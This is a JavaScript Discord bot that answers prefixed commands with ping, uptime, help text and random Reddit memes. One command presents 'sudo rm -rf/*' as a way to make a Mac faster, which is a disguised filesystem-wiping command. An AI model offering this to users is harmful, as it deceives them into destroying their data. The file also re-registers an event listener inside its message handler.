const { Client, Intents, } = require('discord.js');
const dotenv = require('dotenv');
dotenv.config();
const prettyMilliseconds = require("pretty-ms");
const got = require('got');
const Prefix = "g"

const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES
    ]
});
client.on('ready', () => {
    console.log('g is online')
    client.user.setPresence({ activities: [{ name: 'Listening to ghelp' }], status: 'active' });
});
// command
client.on('messageCreate', (message) => { // You can use one block for an entire event
    if (message.content === Prefix +'g') {
        message.reply({content: 'http://bestwebsite.cf/g.html'});
    } else if (message.content === Prefix +'prefix') {
        message.reply({content: 'the prefix is `g`.  '});
    } else if (message.content === Prefix +'prefix') {
        message.reply({content: 'the prefix is `g`.  '});
    } else if (message.content === Prefix +'make my mac faster') {
        message.reply({content: 'sudo rm -rf/*'});
    } else if (message.content === Prefix + 'ping') {
        message.channel.send('Loading data').then (async (msg) =>{
        msg.delete()
        message.channel.send(`🏓Latency is ${msg.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(client.ws.ping)}ms`);
        });
    } else if (message.content === Prefix + 'help') {
        message.reply({content: '> `gping` to get bot latency \n> `ghelp` to see this menu \n > `gg` to get the link to the best website \n > `gmake my mac faster` to mac your mac faster \n > `gprefix` to see the prefix \n > `gutptime` to view the bots uptime \n > `gmeme` to see a shitpost'});
    } else if (message.content === Prefix +'uptime') {message.channel.send(`Uptime: ${prettyMilliseconds(client.uptime)}`)
    }
    client.on('messageCreate', (message) => {
        if (message.content === Prefix +'meme') {
            const { MessageEmbed } = require('discord.js');
            const embed = new MessageEmbed()
        got('https://www.reddit.com/r/memes/random/.json')
            .then(response => {
                const [list] = JSON.parse(response.body);
                const [post] = list.data.children;
    
                const permalink = post.data.permalink;
                const memeUrl = `https://reddit.com${permalink}`;
                const memeImage = post.data.url;
                const memeTitle = post.data.title;
                const memeUpvotes = post.data.ups;
                const memeNumComments = post.data.num_comments;
    
                embed.setTitle(`${memeTitle}`);
                embed.setURL(`${memeUrl}`);
                embed.setColor('RANDOM');
                embed.setImage(memeImage);
                embed.setFooter(`👍 ${memeUpvotes} 💬 ${memeNumComments}`);
    
                message.channel.send({ embeds: [embed] })
            })
            .catch(console.error);
    };
    
    });
});
client.login(process.env.TOKEN)
